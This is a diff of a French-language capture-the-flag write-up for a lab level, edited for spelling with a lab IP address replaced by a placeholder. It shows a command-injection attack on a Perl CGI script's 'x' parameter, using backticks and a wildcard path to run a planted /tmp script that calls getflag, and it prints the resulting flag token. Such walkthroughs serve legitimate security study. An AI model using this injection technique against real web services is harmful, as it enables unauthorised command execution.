@@ -1,4 +1,4 @@
-On trouve dans le dossier home un file **level12.pl** qui contient:
+On trouve dans le dossier **home** un fichier **level12.pl** qui contient:
 
 ```perl
 #!/usr/bin/env perl
@@ -29,18 +29,18 @@ sub n {
 	}
 }
 ```
-On remarque dans le code qu'il y a des "sécurités" par rapport au parametre **x**, ce dernier devant etre en majuscule et sans [\s\t\r\n].
-On essaye donc de passer au travers de ces sécurités en créant un fichier dans /tmp en majuscule et en utilisant les wildcards.
-On verifie les droits:
+On remarque dans le code qu'il y a des "sécurités" par rapport au paramètre **x**, ce dernier devant être en majuscule et sans [\s\t\r\n].
+On essaie donc de passer au travers de ces sécurités en créant un fichier dans **/tmp** en majuscule et en utilisant les wildcards.
+On vérifie les droits:
 
 <pre><code>> echo "whoami > /tmp/test" > /tmp/SCRIPT
 > chmod 777 /tmp/SCRIPT
 </code></pre>
-> Le chmod est important car on doit pouvoir executer /tmp/SCRIPT sans utiliser <code>sh</code>
+> Le chmod est important car on doit pouvoir exécuter /tmp/SCRIPT sans utiliser <code>sh</code>
 
 Par la suite on va utilser la faille en allant sur :
-<pre>http://192.168.1.42:4646/?x=`/*/SCRIPT`</pre>
-> x prend en value /*/SCRIPT en injection, ce qui grâce a la wildcard nous donne /tmp/SCRIPT
+<pre>http://IP:4646/?x=`/*/SCRIPT`</pre>
+> x prend en value /*/SCRIPT en injection, ce qui grâce à la wildcard nous donne /tmp/SCRIPT
 
 > Faire un curl ici ne fonctionne pas, car les droits pris seront ceux de **level12**
 
@@ -51,6 +51,6 @@ Les droits sont bons donc on fait avec <code>getflag</code>
 <pre><code>> echo "getflag > /tmp/test" > /tmp/SCRIPT
 > chmod 777 /tmp/SCRIPT
 </code></pre>
-<pre>http://192.168.1.42:4646/?x=`/*/SCRIPT`</pre>
+<pre>http://IP:4646/?x=`/*/SCRIPT`</pre>
 <pre><code>> cat /tmp/test
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr</code></pre>
